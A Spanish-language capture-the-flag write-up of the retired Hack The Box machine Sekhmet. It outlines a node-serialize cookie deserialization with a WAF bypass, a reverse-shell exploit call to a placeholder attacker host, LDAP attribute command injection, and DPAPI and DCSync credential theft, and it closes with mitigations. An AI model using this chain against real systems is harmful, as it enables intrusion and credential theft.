---
machine: Sekhmet
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, ad, nodejs, deserialization, dpapi, rbcd]
---

# Sekhmet — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La cookie de sesión de Node.js se deserializa con `node-serialize`; el WAF bloquea `_$$ND_FUNC$$_`, pero se evade con escapes Unicode. La shell cae en un servidor Linux unido a AD. Un backup ZipCrypto se rompe con `bkcrack`, el atributo LDAP `mobile` inyecta comandos y `scriptrunner` entrega un Net-NTLMv2. Con `Bob.Wood` y DPAPI se llega a una cuenta administrativa del dominio.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,88,139,389,445,464,636,3268,3269 <IP>
```

- `80/tcp` sirve una aplicación Node.js; `22/tcp` es un host Linux unido al dominio.
- `88/389/445/464/636` confirman un DC de `sekhmet.htb`.
- La aplicación usa `express-session` con cookies y un WAF delante.

## Enumeración

- La cookie `session` es un JSON serializado con `node-serialize`.
- El WAF bloquea `_$$ND_FUNC$$_` literal, pero acepta `$$ND_FUNC$$`.
- El host Linux usa `sssd` contra AD y comparte `/opt/backup` por SMB.

## Foothold

Se forja una cookie con una función `child_process.exec` y se envía con los escapes Unicode. El servidor la deserializa y ejecuta el comando como el usuario del servicio.

```bash
python3 exploit.py --url http://<IP> --lhost <ATTACKER> --lport 443
# Cookie: {"rce":"_$$ND_FUNC$$function(){...}()"}
```

## Movimiento lateral

El backup ZipCrypto se rompe con `bkcrack` usando un archivo conocido y revela credenciales. Con acceso LDAP se modifica el atributo `mobile` de un usuario; un script programado lo usa en un comando y permite inyección. `scriptrunner` fuerza la autenticación de una cuenta de servicio y entrega su Net-NTLMv2, que se crackea para obtener `Bob.Wood`.

## Escalada de privilegios

`Bob.Wood` tiene acceso al host y credenciales DPAPI de Edge. Se descifran con `dpapi.py` y se obtiene la contraseña de una cuenta administrativa. Esa cuenta permite DCSync o un acceso directo al DC para leer la flag de root.

```bash
DonPAPI.py sekhmet.htb/Bob.Wood:<PASSWORD>@<IP>
# Descifrar el blob de Edge y reutilizar la credencial administrativa
secretsdump.py sekhmet.htb/<ADMIN>:<PASSWORD>@<DC>
```

## Evidencia

- Cookie con `_$$ND_FUNC$$` aceptada por el WAF.
- Backup descifrado con `bkcrack` y atributo `mobile` modificado.
- Hash de `Bob.Wood`, blob DPAPI y credencial administrativa.

## Lecciones aprendidas

- Un WAF que solo bloquea cadenas literales se evade con escapes.
- La deserialización de cookies en Node.js es ejecución remota.
- ZipCrypto no protege un backup y los atributos LDAP pueden ser vectores de inyección.

## Mitigación y detección

- No deserializar cookies; firmar y validar sesiones con un almacén del servidor.
- Usar cifrado fuerte para backups y restringir su lectura.
- Validar atributos LDAP antes de usarlos en comandos y proteger las cuentas de servicio.

## Referencias

- [0xdf — Sekhmet](https://0xdf.gitlab.io/2023/04/01/htb-sekhmet.html)
- [IppSec — Sekhmet](https://www.youtube.com/watch?v=vsgPsMZx59w)
- [Hack The Box — Sekhmet](https://app.hackthebox.com/machines/sekhmet)
